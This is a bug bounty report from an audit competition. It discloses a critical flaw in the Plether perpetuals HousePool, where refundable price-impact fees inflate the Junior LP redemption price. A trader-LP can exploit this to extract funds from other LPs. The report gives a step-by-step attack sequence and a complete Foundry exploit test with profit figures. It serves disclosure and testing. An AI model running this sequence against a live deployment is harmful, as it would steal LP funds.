# \#99977 [SC-Critical] Refundable VPI in Junior redemption NAV lets a trader-LP extract funds from other LPs

**Submitted on Nov 15th 2026 at 23:49:53 UTC by @iFrescoo for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99977
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

An attacker controlling a Junior LP account and a trader account can open a position that pays positive virtual price impact (VPI) into the pool, redeem Junior shares at a NAV that includes that payment, and then close the position to reclaim the VPI as a rebate. This works with unchanged basket prices. The attacker receives an inflated redemption payout; an independent Junior LP's remaining shares lose redeemable value. A local Foundry test reproduces both effects at roughly 50 million USDG pool depth.

## Vulnerability Details

1. The attacker requests redemption of their Junior shares and waits until the request is eligible for an LP epoch settlement. The attacker also controls a separate ordinary trader account. No privileged role needs to misbehave.
2. The trader commits and executes a bounded 20 million USDG LONG opening through the production `OrderRouter`. The opening charges roughly 40,000 USDG of positive VPI. `CfdEngineSettlementSidecar` routes the collected amount into `HousePool` as claimant revenue. With active tranche principal, `HousePool.recordClaimantInflow` immediately increases accounted pool assets.
3. A permissionless caller executes `OrderRouter.settleLpEpoch` at the unchanged basket price. The pool reconciles before funding Junior redemptions. The refundable VPI cash is included in the Junior redemption price, so the attacker receives more USDG for the shares being redeemed.
4. In the controlled PoC, the attacker deposits those redeemed assets into Senior through the public LP flow before closing the trade. `HousePool.totalAssets()` immediately before the close equals the post-open pool depth before redemption: 50,040,000.002424 USDG. There are no outstanding trader claims. This holds the close's VPI depth denominator constant.
5. The trader closes through the public Router at the same component prices. The lifetime VPI clamp permits a rebate up to VPI previously paid by that position. The trader receives that rebate after the LP redemption has already captured part of the earlier pool inflow.

The redemption price treats positive VPI from an open position as final LP value even though that position can reclaim it on close. The lifetime clamp prevents a net-negative VPI round trip for the trader account alone; it does not include the value already withdrawn through the attacker's LP account. The protocol's symmetric marked-NAV rule is described in `ACCOUNTING_SPEC.md:158-174`.

The closest published issue is "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" in the scan report (`audits/scan-plether-fi-plether-core-d4541b49.md:1742`). That issue changes the closing rebate by lowering pool depth. In this test, pool depth is restored before close and the attacker still gains over 5,600 USDG. The sequence does not rely on the acknowledged Arbitrum/Pyth clock alignment issue or a change in basket price.

## Impact Details

Claimed severity: **Critical**. In-scope impact: **Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield**. In the controlled local test, the attacker gains 5,672.452579 USDG across new Senior shares, remaining Junior shares, trader balance and residual USDG, after trade costs. The independent Junior LP's existing shares lose 13,672.452989 USDG of redeemable value before that LP acts. A later public redemption pays out a funded portion of those shares at the lower price. That later payout also reflects the ordinary redemption fee and passage of time, so it is not used to calculate the 13,672.452989 USDG loss. The captured-values test, using six price/confidence pairs from a repository Pyth fixture with MockPyth at 50 million USDG depth, still shows 5,043.676743 USDG attacker gain and 12,720.914833 USDG loss of the independent LP's share value.

The smaller-pool test applies the same public sequence and restored-depth control to 5 million USDG of LP capital: 3 million from the attacker and 2 million from the independent LP. With 100,000 USDG of trader collateral and a 2 million USDG position, the attacker gains 567.064091 USDG while the independent LP's shares lose 1,367.244141 USDG of value.

The tests use release risk parameters: a 0.2% initial-margin floor, a 40% skew cap, a 4 bp execution fee, the 40 million USDG / 80% Senior cap, and the configured settlement buffer. The smaller test shows that 20 million USDG of independent Junior liquidity is not a fixed requirement of the bug. The tests do not establish how much real liquidity will be present at launch or measure actual gas and Hermes API costs. Historical testnet observations support the price confidence used in the PoC but do not guarantee a signed update at an attacker-chosen time.

## References

- [Frozen competition commit](https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8)
- [Open VPI charge and pool inflow](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L446-L464)
- [HousePool claimant inflow accounting](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L624-L650)
- [Junior redemption funding after reconciliation](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol#L835-L887)
- [Close VPI lifetime clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/libraries/CloseAccountingLib.sol#L103-L118)
- [Documented purpose of the lifetime clamp](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/SECURITY.md#L1438-L1444)
- [Close rebate payout](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/CfdEngineSettlementSidecar.sol#L618-L628)
- [Symmetric marked-NAV specification](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/ACCOUNTING_SPEC.md#L158-L174)
- [Closest published issue](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/audits/scan-plether-fi-plether-core-d4541b49.md#L1742)
- [Captured six-feed Pyth price/confidence fixture](https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/deployments/releases/2026-10-12-perps-arbitrum-sepolia-v1.3.1/activation-pyth-fixture.json)
- [Plether competition scope and PoC rules](https://immunefi.com/audit-competition/plether/scope/)


## Proof of Concept

## Attack sequence

1. Fund an independent Junior LP with 20 million USDG and the attacker Junior LP with 30 million USDG. After the deposit cooldown, the attacker requests redemption of 29/30 of their Junior shares. Fund the attacker's separate trader account with 1 million USDG.
2. After the redemption request becomes eligible, the trader calls `OrderRouter.commitOrder` for a 20 million USDG LONG. A permissionless caller executes it with `OrderRouter.executeOrder`. The open pays about 40,000 USDG of positive VPI into `HousePool`.
3. With the six component prices unchanged, a permissionless caller calls `OrderRouter.settleLpEpoch`. The attacker calls `TrancheVault.redeem` and receives a Junior payout priced with that VPI included in NAV.
4. The attacker deposits the redeemed USDG into Senior through the public LP flow and settles that deposit. This restores `HousePool.totalAssets()` to its post-open, pre-redemption value of 50,040,000.002424 USDG. No trader claims are outstanding.
5. The trader commits and executes a full close through the public Router at the same component prices. The close pays a VPI rebate. Compare the attacker's combined holdings and the independent LP's share value before the open and after the close.
6. As a follow-up, the independent LP requests redemption. The next epoch funds part of the request, and the LP claims the USDG payout through `TrancheVault.redeem`. The test counts the pending shares separately from cash already paid.

`test_H1_ProfitAtFiveMillionPoolDepth` repeats this sequence with one tenth of the main test's LP deposits, trader collateral and order size. The release risk parameters remain the same.

## Environment and steps

1. Check out the Plether competition's frozen in-scope commit `a82d4fefb02768e5b3bddcc97dee371eee24fea8`. Do not modify any file under `packages/perps/src`.
2. Save the complete Solidity file below as `packages/perps/test/perps/poc/H1VpiNavRoundTrip.t.sol`.
3. From `packages/perps`, run `forge test --match-path test/perps/poc/H1VpiNavRoundTrip.t.sol -vv`.
4. Expected result: `4 passed; 0 failed`. The 50 million USDG restored-depth test logs attacker gain `5672452579`, independent Junior share-value loss `13672452989`, and later funded payout `13729440995147` (USDG has six decimals). The 5 million USDG test logs attacker gain `567064091` and independent Junior share-value loss `1367244141`. The six-feed captured-values test logs attacker gain `5043676743` and pre-redemption Junior share-value loss `12720914833`.

The test deploys the unmodified production `OrderRouter`, uses only public Router/LP entrypoints for the attack sequence, and mocks only USDG and Pyth price updates, which are outside the competition's in-scope contracts. Its captured six-feed price/confidence pairs come from the repository's `deployments/releases/2026-10-12-perps-arbitrum-sepolia-v1.3.1/activation-pyth-fixture.json`, rescaled to MockPyth's exponent. It does not replay the signed payload or call a public deployment. The first test closes after the attacker's redemption is funded but before the attacker calls `redeem`; the other tests claim the attacker's redemption before closing.

## Complete Foundry test

```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {MockSettlementToken} from "../../utils/MockSettlementToken.sol";
import {BasePerpTest} from "../BasePerpTest.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {CfdEngineLens} from "@plether/perps/CfdEngineLens.sol";
import {CfdOrderPolicyEvaluator} from "@plether/perps/CfdOrderPolicyEvaluator.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {HousePool} from "@plether/perps/HousePool.sol";
import {HousePoolRedemptionMathSidecar} from "@plether/perps/HousePoolRedemptionMathSidecar.sol";
import {MarginClearinghouse} from "@plether/perps/MarginClearinghouse.sol";
import {OrderLifecycleBook} from "@plether/perps/OrderLifecycleBook.sol";
import {OrderRouter} from "@plether/perps/OrderRouter.sol";
import {OrderRouterAdmin} from "@plether/perps/OrderRouterAdmin.sol";
import {OrderRouterExecutionSidecar} from "@plether/perps/OrderRouterExecutionSidecar.sol";
import {OrderRouterLiquidationBatchSidecar} from "@plether/perps/OrderRouterLiquidationBatchSidecar.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {PletherOracle} from "@plether/perps/PletherOracle.sol";
import {TerminalNavBookV2} from "@plether/perps/TerminalNavBookV2.sol";
import {TrancheVault} from "@plether/perps/TrancheVault.sol";
import {IOrderRouterAccounting} from "@plether/perps/interfaces/IOrderRouterAccounting.sol";
import {IOrderRouterAdminHost} from "@plether/perps/interfaces/IOrderRouterAdminHost.sol";
import {MockPyth} from "@plether/test-utils/MockPyth.sol";
import {console2} from "forge-std/console2.sol";

/// @notice H-1: a refundable VPI charge is booked as Junior NAV, so a Junior LP can redeem at a price inflated by
///         their own round-trip trade. Release risk parameters (DEPLOYMENT.md) are used.
contract H1VpiNavRoundTripTest is BasePerpTest {

    OrderRouter internal productionRouter;
    bytes32[6] internal feedIds;
    int64[6] internal feedPrices;
    uint64[6] internal feedConfs;

    address internal attackerLp = address(0xA11CE);
    address internal attackerTrader = address(0xB0B);
    address internal keeper = address(0xCAFE);
    uint256 internal openTargetPrice = 99_997_500;

    uint256 internal constant NOTIONAL_SIZE = 20_000_000e18; // 20M USDG notional at $1.00
    uint256 internal orderSize = NOTIONAL_SIZE;
    uint256 internal orderMarginAssets = 300_000e6;

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    // Victim Junior LP is address(this).
    function setUp() public override {
        vm.warp(SETUP_TIMESTAMP);
        settlementToken = new MockSettlementToken();
        clearinghouse = new MarginClearinghouse(address(settlementToken));
        engine = _deployEngine(_riskParams());
        _syncEngineAdmin();
        terminalNavBook = new TerminalNavBookV2(address(engine), uint32(CAP_PRICE));
        engine.setTerminalNavBook(address(terminalNavBook));
        engineLens = new CfdEngineLens(address(engine));
        housePoolRedemptionMathSidecar = new HousePoolRedemptionMathSidecar();
        pool = new HousePool(address(settlementToken), address(engine), address(housePoolRedemptionMathSidecar));
        baseMockPyth = new MockPyth();
        _configureSixFeedBasket();

        seniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), true, "Plether Senior LP", "seniorAssets", 0, address(0)
        );
        juniorVault = new TrancheVault(
            IERC20(address(settlementToken)), address(pool), false, "Plether Junior LP", "juniorAssets", 0, address(0)
        );
        pool.setSeniorVault(address(seniorVault));
        pool.setJuniorVault(address(juniorVault));
        engine.setPool(address(pool));

        pletherOracle = new PletherOracle(
            address(engine), address(pool), address(baseMockPyth), _feedIds(), _weights(), _basePrices(), _inversions()
        );
        policyEvaluator = new CfdOrderPolicyEvaluator();
        orderExecutionSidecar = new OrderRouterExecutionSidecar();
        address predictedRouter = vm.computeCreateAddress(address(this), vm.getNonce(address(this)) + 2);
        OrderLifecycleBook lifecycleBook =
            new OrderLifecycleBook(predictedRouter, address(engine), address(clearinghouse), address(pool));
        OrderRouterLiquidationBatchSidecar keeperSidecar = new OrderRouterLiquidationBatchSidecar(predictedRouter);
        productionRouter = new OrderRouter(
            address(engine),
            address(engineLens),
            address(pool),
            address(pletherOracle),
            address(keeperSidecar),
            address(policyEvaluator),
            address(orderExecutionSidecar),
            address(lifecycleBook)
        );
        assertEq(address(productionRouter), predictedRouter);
        routerAdmin = OrderRouterAdmin(productionRouter.admin());
        engine.setOrderRouter(address(productionRouter));
        clearinghouse.setEngine(address(engine));
        _setSeniorCapacity(40_000_000e6, 8000);

        settlementToken.mint(address(this), 2e6);
        settlementToken.approve(address(pool), 2e6);
        pool.initializeSeedPosition(false, 1e6, address(this));
        pool.initializeSeedPosition(true, 1e6, address(this));
        pool.activateTrading();

        IOrderRouterAdminHost.RouterConfig memory config = _productionRouterConfig();
        config.adverseConfidenceMultiplierBps = 2500;
        _setRouterConfig(config);
        vm.warp(vm.getBlockTimestamp() + 1 days);
    }

    function _configureSixFeedBasket() internal {
        feedIds = [
            bytes32(0xa995d00bb36a63cef7fd2c287dc105fc8f3d93779f062f09551b0af3e81ec30b),
            bytes32(0xef2c98c804ba503c6a707e38be4dfbb16683775f195b091252bf24693042fd52),
            bytes32(0x84c2dde9633d93d1bcad84e7dc41c9d56578b7ec52fabedc1f335d673df0a7c1),
            bytes32(0x3112b03a41c910ed446852aacf67118cb1bec67b2cd0b9a214c58cc0eaa2ecca),
            bytes32(0x8ccb376aa871517e807358d4e3cf0bc7fe4950474dbe6c9ffc21ef64e43fc676),
            bytes32(0x0b1e3297e69f162877b577b0d6a47a0d63b2392bc8499e6540da4187a63e28f8)
        ];
        feedPrices = [
            int64(117_500_000),
            int64(15_673_981_191),
            int64(134_480_000),
            int64(137_211_855),
            int64(920_810_313),
            int64(79_302_141)
        ];
    }

    function _feedIds() internal view returns (bytes32[] memory ids) {
        ids = new bytes32[](6);
        for (uint256 i; i < 6; i++) {
            ids[i] = feedIds[i];
        }
    }

    function _weights() internal pure returns (uint256[] memory weights) {
        weights = new uint256[](6);
        weights[0] = 576e15;
        weights[1] = 136e15;
        weights[2] = 119e15;
        weights[3] = 91e15;
        weights[4] = 42e15;
        weights[5] = 36e15;
    }

    function _basePrices() internal pure returns (uint256[] memory bases) {
        bases = new uint256[](6);
        bases[0] = 117_500_000;
        bases[1] = 638_000;
        bases[2] = 134_480_000;
        bases[3] = 72_880_000;
        bases[4] = 10_860_000;
        bases[5] = 126_100_000;
    }

    function _inversions() internal pure returns (bool[] memory inversions) {
        inversions = new bool[](6);
        inversions[1] = true;
        inversions[3] = true;
        inversions[4] = true;
        inversions[5] = true;
    }

    function _productionRouterConfig() internal view returns (IOrderRouterAdminHost.RouterConfig memory config) {
        config.maxExecutionWindowSeconds = productionRouter.maxExecutionWindowSeconds();
        config.orderExecutionStalenessLimit = pletherOracle.orderExecutionStalenessLimit();
        config.liquidationStalenessLimit = pletherOracle.liquidationStalenessLimit();
        config.basketMaxConfidenceRatioBps = pletherOracle.basketMaxConfidenceRatioBps();
        config.orderSettlementWindow = pletherOracle.orderSettlementWindow();
        config.maxComponentPublishTimeDivergence = pletherOracle.maxComponentPublishTimeDivergence();
        config.adverseConfidenceMultiplierBps = pletherOracle.adverseConfidenceMultiplierBps();
        config.minOpenNotionalAssets = productionRouter.minOpenNotionalAssets();
        config.openOrderExecutionBountyBps = productionRouter.openOrderExecutionBountyBps();
        config.minOpenOrderExecutionBountyAssets = productionRouter.minOpenOrderExecutionBountyAssets();
        config.maxOpenOrderExecutionBountyAssets = productionRouter.maxOpenOrderExecutionBountyAssets();
        config.positionProtectionTriggerBountyAssets = productionRouter.positionProtectionTriggerBountyAssets();
        config.maxPendingOrders = productionRouter.maxPendingOrders();
        config.minEngineGas = productionRouter.minEngineGas();
        config.maxPruneOrdersPerCall = productionRouter.maxPruneOrdersPerCall();
    }

    function _priceUpdate() internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = vm.getBlockTimestamp();
        uint64 nextOrderId = productionRouter.nextExecuteId();
        if (nextOrderId != 0) {
            (IOrderRouterAccounting.PendingOrderView memory pending,) =
                productionRouter.getPendingOrderView(nextOrderId);
            uint256 candidate = uint256(pending.commitTime) + 1;
            if (pending.commitTime != 0 && candidate <= publishTime) {
                publishTime = candidate;
            }
        }
        MockPyth.FeedUpdate[] memory updates = new MockPyth.FeedUpdate[](6);
        for (uint256 i; i < 6; i++) {
            uint64 confidence = feedConfs[i] == 0 ? uint64(uint64(feedPrices[i]) / 10_000) : feedConfs[i];
            updates[i] = MockPyth.FeedUpdate({
                id: feedIds[i], price: MockPyth.MockPrice(feedPrices[i], confidence, -8, publishTime, publishTime - 1)
            });
        }
        updateData = new bytes[](1);
        updateData[0] = abi.encode(updates);
    }

    function _fundJuniorThroughRouter(
        address lp,
        uint256 amount
    ) internal returns (uint256 shares) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, lp, lp);
        vm.stopPrank();

        vm.warp(juniorVault.depositEpochStart(requestId) + 1);
        bytes[] memory priceUpdate = _priceUpdate();
        vm.prank(keeper);
        productionRouter.settleLpEpoch(priceUpdate);
        assertEq(juniorVault.claimableDepositRequest(requestId, lp), amount);
        vm.prank(lp);
        shares = juniorVault.claimDeposit(requestId, amount, lp, lp);
    }

    function _reinvestRedemptionAsSenior(
        uint256 amount
    ) internal returns (uint256 shares) {
        vm.startPrank(attackerLp);
        settlementToken.approve(address(seniorVault), amount);
        uint256 requestId = seniorVault.requestDeposit(amount, attackerLp, attackerLp);
        vm.stopPrank();

        vm.warp(seniorVault.depositEpochStart(requestId) + 1);
        bytes[] memory priceUpdate = _priceUpdate();
        vm.prank(keeper);
        productionRouter.settleLpEpoch(priceUpdate);
        assertEq(seniorVault.claimableDepositRequest(requestId, attackerLp), amount);
        vm.prank(attackerLp);
        shares = seniorVault.claimDeposit(requestId, amount, attackerLp, attackerLp);
    }

    function _executePublicOrder(
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = OrderV3Types.OrderRequest({
            clientOrderId: bytes32(uint256(productionRouter.nextCommitId())),
            side: CfdTypes.Side.LONG,
            sizeDelta: orderSize,
            marginDelta: isClose ? 0 : orderMarginAssets,
            targetPrice: isClose ? type(uint256).max : openTargetPrice,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + 60),
                executionWindowSeconds: 60,
                allowedExecutionModes: 1,
                expectedConfigHash: productionRouter.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: 100e6,
                maxExecutionNotionalAssets: 21_000_000e6,
                maxGrossAccountDebitAssets: 1_000_000e6,
                maxActionChargeAssets: 100_000e6,
                maxExplicitFeesAssets: 20_000e6,
                maxPostPositionSize: orderSize,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
        vm.prank(attackerTrader);
        uint64 orderId = productionRouter.commitOrder(request);
        bytes[] memory priceUpdate = _priceUpdate();
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = productionRouter.executeOrder(orderId, priceUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "public order must execute");
    }

    function test_H1_JuniorLpExitsAtNavInflatedByOwnRefundableVpi() public {
        _fundJuniorThroughRouter(address(this), 20_000_000e6);
        uint256 attackerShares = _fundJuniorThroughRouter(attackerLp, 30_000_000e6);
        uint256 redeemShares = attackerShares * 29 / 30;

        // Pass the deposit cooldown and sit one minute into a fresh hour, well before the request cutoff.
        vm.warp(((vm.getBlockTimestamp() / 1 hours) + 3) * 1 hours + 60);

        vm.prank(attackerLp);
        uint256 requestId = juniorVault.requestRedeem(redeemShares, attackerLp, attackerLp);

        // Epoch matures.
        vm.warp(pool.lpEpochStart(requestId) + 5);

        _fundTrader(attackerTrader, 1_000_000e6);

        uint256 victimShares = juniorVault.balanceOf(address(this));
        uint256 attackerFair = juniorVault.convertToAssets(attackerShares);
        uint256 victimBefore = juniorVault.convertToAssets(victimShares);
        uint256 traderBefore = clearinghouse.balanceAssets(attackerTrader);
        uint256 poolBefore = pool.totalAssets();

        // 1. Skew-building open: pays VPI into the pool.
        _executePublicOrder(false);
        uint256 vpiPaid = pool.totalAssets() - poolBefore;
        uint256 attackerInflated = juniorVault.convertToAssets(redeemShares);
        (,,,,,, int256 vpiAccruedAfterOpen) = engine.positions(attackerTrader);
        assertGt(vpiAccruedAfterOpen, 0, "the trade paid positive lifetime VPI");

        // Counterfactual: close at the original pool depth. This isolates the known depth/rebate issue.
        uint256 snapshotId = vm.snapshotState();
        _executePublicOrder(true);
        uint256 traderAfterNoLpExit = clearinghouse.balanceAssets(attackerTrader);
        assertTrue(vm.revertToState(snapshotId));

        // 2. LP epoch settles at the same mark; the attacker's redemption is funded at the inflated price.
        bytes[] memory settlementPrice = _priceUpdate();
        vm.prank(keeper);
        productionRouter.settleLpEpoch(settlementPrice);
        assertEq(juniorVault.claimableRedeemRequest(requestId, attackerLp), redeemShares, "redemption fully funded");

        // 3. Full close: the VPI comes back to the trader as a rebate.
        _executePublicOrder(true);

        vm.prank(attackerLp);
        uint256 attackerOut = juniorVault.redeem(redeemShares, attackerLp, attackerLp);

        uint256 attackerRemaining = juniorVault.convertToAssets(attackerShares - redeemShares);
        uint256 victimAfter = juniorVault.convertToAssets(victimShares);
        uint256 traderAfter = clearinghouse.balanceAssets(attackerTrader);
        int256 combinedDelta =
            int256(attackerOut + attackerRemaining + traderAfter) - int256(attackerFair + traderBefore);
        int256 extraTraderRebateFromLowerDepth = int256(traderAfter) - int256(traderAfterNoLpExit);

        console2.log("VPI paid into pool on open      ", vpiPaid);
        console2.log("attacker LP total fair value    ", attackerFair);
        console2.log("attacker LP quoted after open   ", attackerInflated);
        console2.log("attacker LP received            ", attackerOut);
        console2.log("attacker LP remaining value     ", attackerRemaining);
        console2.log("attacker combined delta");
        console2.logInt(combinedDelta);
        console2.log("trader cost of round trip       ", traderBefore - traderAfter);
        console2.log("extra trader proceeds from lower depth");
        console2.logInt(extraTraderRebateFromLowerDepth);
        console2.log("attacker gain excluding depth effect");
        console2.logInt(combinedDelta - extraTraderRebateFromLowerDepth);
        console2.log("victim Junior value before      ", victimBefore);
        console2.log("victim Junior value after       ", victimAfter);
        console2.log("victim Junior loss              ", victimBefore - victimAfter);

        assertGt(attackerOut, juniorVault.convertToAssets(redeemShares), "funded payout exceeds later share price");
        assertGt(victimBefore - victimAfter, 13_000e6, "independent Junior LP loses over 13K USDG");
        assertGt(combinedDelta, 5000e6, "combined LP and trader gain exceeds 5K USDG");
        assertLt(extraTraderRebateFromLowerDepth, 100e6, "depth-dependent rebate is not the exploit's source");
        assertGt(combinedDelta - extraTraderRebateFromLowerDepth, 5000e6);
    }

    function test_H1_ProfitPersistsWithOriginalPoolDepthAtClose() public {
        _assertH1WithRestoredPoolDepth(13_000e6);
    }

    function _assertH1WithRestoredPoolDepth(
        uint256 minimumVictimLoss
    ) internal {
        _assertH1WithRestoredPoolDepth(minimumVictimLoss, 20_000_000e6, 30_000_000e6, 1_000_000e6, 5000e6);
    }

    function _assertH1WithRestoredPoolDepth(
        uint256 minimumVictimLoss,
        uint256 victimDepositAssets,
        uint256 attackerDepositAssets,
        uint256 traderFundingAssets,
        uint256 minimumAttackerGain
    ) internal {
        _fundJuniorThroughRouter(address(this), victimDepositAssets);
        uint256 attackerShares = _fundJuniorThroughRouter(attackerLp, attackerDepositAssets);
        uint256 redeemShares = attackerShares * 29 / 30;

        vm.warp(((vm.getBlockTimestamp() / 1 hours) + 3) * 1 hours + 60);
        vm.prank(attackerLp);
        uint256 requestId = juniorVault.requestRedeem(redeemShares, attackerLp, attackerLp);
        vm.warp(pool.lpEpochStart(requestId) + 5);
        _fundTrader(attackerTrader, traderFundingAssets);

        uint256 victimShares = juniorVault.balanceOf(address(this));
        uint256 victimBefore = juniorVault.convertToAssets(victimShares);
        uint256 attackerBefore =
            juniorVault.convertToAssets(attackerShares) + clearinghouse.balanceAssets(attackerTrader);

        _executePublicOrder(false);
        uint256 originalDepth = pool.totalAssets();
        bytes[] memory priceUpdate = _priceUpdate();
        vm.prank(keeper);
        productionRouter.settleLpEpoch(priceUpdate);
        assertEq(juniorVault.claimableRedeemRequest(requestId, attackerLp), redeemShares);

        vm.prank(attackerLp);
        uint256 redeemedAssets = juniorVault.redeem(redeemShares, attackerLp, attackerLp);
        uint256 seniorShares = _reinvestRedemptionAsSenior(redeemedAssets);
        assertEq(pool.totalAssets(), originalDepth, "close uses the original pool depth");
        assertEq(engine.totalTraderClaimBalanceAssets(), 0, "no claims change economic depth");

        _executePublicOrder(true);
        uint256 attackerAfter = settlementToken.balanceOf(attackerLp) + seniorVault.convertToAssets(seniorShares)
            + juniorVault.convertToAssets(attackerShares - redeemShares) + clearinghouse.balanceAssets(attackerTrader);
        uint256 victimAfter = juniorVault.convertToAssets(victimShares);

        console2.log("original and restored close depth", originalDepth);
        console2.log("attacker gain with restored depth", attackerAfter - attackerBefore);
        console2.log("victim Junior loss with restored depth", victimBefore - victimAfter);
        assertGt(attackerAfter - attackerBefore, minimumAttackerGain);
        assertGt(victimBefore - victimAfter, minimumVictimLoss);

        // The independent LP can realize part of the loss through the public redemption flow.
        uint256 victimRedeemShares = juniorVault.maxRequestRedeem(address(this));
        assertGt(victimRedeemShares, victimShares - 1e12, "victim can redeem nearly all shares");
        uint256 victimRequestId = juniorVault.requestRedeem(victimRedeemShares, address(this), address(this));
        vm.warp(pool.lpEpochStart(victimRequestId) + 5);
        bytes[] memory victimSettlementPrice = _priceUpdate();
        vm.prank(keeper);
        productionRouter.settleLpEpoch(victimSettlementPrice);
        uint256 fundedVictimShares = juniorVault.claimableRedeemRequest(victimRequestId, address(this));
        assertGt(fundedVictimShares, victimRedeemShares / 2, "victim has material funded redemption");
        uint256 victimPayout = juniorVault.redeem(fundedVictimShares, address(this), address(this));
        assertGt(victimPayout, 1_000_000e6, "victim receives a material USDG payout");
        assertEq(
            juniorVault.pendingRedeemRequest(victimRequestId, address(this)),
            victimRedeemShares - fundedVictimShares,
            "unfunded victim shares remain pending"
        );
        console2.log("victim Junior realized payout after close", victimPayout);
    }

    function test_H1_ProfitAtFiveMillionPoolDepth() public {
        orderSize = 2_000_000e18;
        orderMarginAssets = 30_000e6;
        _assertH1WithRestoredPoolDepth(1_300e6, 2_000_000e6, 3_000_000e6, 100_000e6, 500e6);
    }

    /// @notice Uses price/conf values captured in the repository's 2026-10-12 signed Pyth activation fixture.
    ///         Values are rescaled from their original exponents to the MockPyth -8 exponent.
    function test_H1_ProfitWithCapturedSixFeedPythValues() public {
        feedPrices = [
            int64(111_747_000),
            int64(15_862_200_000),
            int64(132_317_000),
            int64(142_659_000),
            int64(1_002_479_000),
            int64(83_322_000)
        ];
        feedConfs = [uint64(3000), uint64(500_000), uint64(4000), uint64(3000), uint64(94_000), uint64(3000)];
        openTargetPrice = 95_000_000;
        _assertH1WithRestoredPoolDepth(12_000e6);
    }

}
```

